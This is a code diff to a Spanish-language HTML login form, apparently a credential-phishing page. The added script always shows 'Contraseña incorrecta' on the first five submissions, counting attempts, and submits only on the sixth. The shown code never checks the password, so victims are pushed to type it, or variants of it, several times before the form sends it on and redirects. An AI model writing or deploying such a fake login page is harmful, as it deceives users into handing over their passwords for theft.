@@ -28,12 +28,12 @@
       <input class="border border-gray-300 rounded px-4 py-2 focus:outline-none focus:ring-1 focus:ring-emerald-500" 
              name="correo" placeholder="Correo electrónico" type="email" required>
 
-      <!-- Nombre después -->
+      <!-- Contraseña después -->
       <div>
         <input id="nombre" 
                class="border border-gray-300 rounded px-4 py-2 w-full focus:outline-none focus:ring-1 focus:ring-emerald-500" 
-               name="nombre" placeholder="ingrese su contraseña" required>
-        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">contraseña incorrecta</p>
+               name="nombre" placeholder="Ingrese su contraseña" type="password" required>
+        <p id="errorNombre" class="text-red-600 text-sm mt-1 hidden">❌ Contraseña incorrecta</p>
       </div>
       
       <!-- Redirección después de enviar -->
@@ -44,11 +44,9 @@
       <!-- Botón -->
       <button type="submit" 
               class="bg-blue-600 hover:bg-blue-700 text-white py-2 rounded font-medium">
-        iniciar sesión 
+        Iniciar sesión
       </button>
     </form>
-
-    <!-- Link de volver -->
 
   </div>
 
@@ -60,11 +58,13 @@
       const nombre = document.getElementById("nombre");
       const errorMsg = document.getElementById("errorNombre");
 
-      if (intentoNombre === 0) {
-        e.preventDefault(); // Bloquea envío la primera vez
+      intentoNombre++;
+
+      if (intentoNombre < 6) { // Los primeros 5 intentos bloquea
+        e.preventDefault();
         errorMsg.classList.remove("hidden");
         nombre.classList.add("border-red-500");
-        intentoNombre++;
+        errorMsg.textContent = "❌ Contraseña incorrecta (intento " + intentoNombre + " de 5)";
       } else {
         errorMsg.classList.add("hidden");
         nombre.classList.remove("border-red-500");
